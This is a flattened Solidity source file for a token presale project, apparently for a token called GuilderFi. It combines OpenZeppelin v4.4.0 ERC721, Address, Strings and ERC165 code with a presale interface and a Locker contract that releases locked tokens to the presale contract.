     * @dev Transfers `tokenId` token from `from` to `to`.
     *
     * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Gives permission to `to` to transfer `tokenId` token to another account.
     * The approval is cleared when the token is transferred.
     *
     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
     *
     * Requirements:
     *
     * - The caller must own the token or be an approved operator.
     * - `tokenId` must exist.
     *
     * Emits an {Approval} event.
     */
    function approve(address to, uint256 tokenId) external;

    /**
     * @dev Returns the account approved for `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function getApproved(uint256 tokenId) external view returns (address operator);

    /**
     * @dev Approve or remove `operator` as an operator for the caller.
     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
     *
     * Requirements:
     *
     * - The `operator` cannot be the caller.
     *
     * Emits an {ApprovalForAll} event.
     */
    function setApprovalForAll(address operator, bool _approved) external;

    /**
     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
     *
     * See {setApprovalForAll}
     */
    function isApprovedForAll(address owner, address operator) external view returns (bool);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (token/ERC721/IERC721Receiver.sol)

pragma solidity ^0.8.0;

/**
 * @title ERC721 token receiver interface
 * @dev Interface for any contract that wants to support safeTransfers
 * from ERC721 asset contracts.
 */
interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (token/ERC721/extensions/IERC721Metadata.sol)

pragma solidity ^0.8.0;

import "../IERC721.sol";

/**
 * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
 * @dev See https://eips.ethereum.org/EIPS/eip-721
 */
interface IERC721Metadata is IERC721 {
    /**
     * @dev Returns the token collection name.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the token collection symbol.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
     */
    function tokenURI(uint256 tokenId) external view returns (string memory);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/Address.sol)

pragma solidity ^0.8.0;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/Strings.sol)

pragma solidity ^0.8.0;

/**
 * @dev String operations.
 */
library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    /**
     * @dev Converts a `uint256` to its ASCII `string` decimal representation.
     */
    function toString(uint256 value) internal pure returns (string memory) {
        // Inspired by OraclizeAPI's implementation - MIT licence
        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
     */
    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
     */
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/introspection/ERC165.sol)

pragma solidity ^0.8.0;

import "./IERC165.sol";

/**
 * @dev Implementation of the {IERC165} interface.
 *
 * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
 * for the additional interface id that will be supported. For example:
 *
 * ```solidity
 * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
 *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
 * }
 * ```
 *
 * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
 */
abstract contract ERC165 is IERC165 {
    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/introspection/IERC165.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[EIP].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ILocker {
  function withdraw(address _walletAddress) external;
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IPreSale {
  // arrays
  function purchaseAmount(address _address) external returns (uint256);
  function refundClaimed(address _address) external returns (bool);
  function locker(address _address) external returns (address);
  
  // public getter functions
  function token() external view returns (address);
  function isPublicSaleOpen() external view returns (bool);
  function isWhitelistSaleOpen(uint256 tierId) external view returns (bool);
  function publicSaleCloseDate() external view  returns (uint256);
  function whitelistSaleCloseDate(uint256 tierId) external view  returns (uint256);
  function softCap() external view  returns (uint256);
  function lockerUnlockDate() external view  returns (uint256);
  function isRefundActivated() external returns (bool);
  function tokensSold() external returns (uint256);
  function lockDuration() external returns (uint256);
  function isSaleClosed() external returns (bool);

  function getTier(address _address) external view returns (
    uint256 tierId,
    uint256 minAmount,
    uint256 maxAmount,
    uint256 tokensPerEth
  );

  // external setter functions
  function openPublicSale(bool isOpen) external;
  function openWhitelistSale(uint256 tierId, bool isOpen) external;
  function setPublicSaleCloseDate(uint256 date) external;
  function setWhitelistSaleCloseDate(uint256 tierId, uint256 date) external;
  function setSoftCap(uint256 softCapAmount) external;
  function addToWhitelist(address[] memory _addresses, uint256 _tierId) external;
  function removeFromWhitelist(address[] memory _addresses) external;
  function setLockDuration(uint256 _duration) external;

  // functions
  function buyTokens() external payable;
  function finalizeSale() external;
  function claimRefund() external returns (bool);
  function unlockTokens() external;
  function cancelSale() external;

  function addCustomTier(
    uint256 tierId,
    uint256 minPurchaseAmount,
    uint256 maxPurchaseAmount,
    uint256 tokensPerEth
  ) external;
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "./interfaces/ILocker.sol";
import "./interfaces/IGuilderFi.sol";

contract Locker is ILocker {
  address public presaleAddress;
  IGuilderFi public token;

  constructor(
    address _presaleAddress,
    address _tokenAddress
  ) {
    presaleAddress = _presaleAddress;
    token = IGuilderFi(_tokenAddress);
  }

  function withdraw(address _walletAddress) external {
    require(msg.sender == presaleAddress, "Sender is not presale contract");

    uint256 balance = token.balanceOf(address(this));
    token.transfer(_walletAddress, balance);
  }
}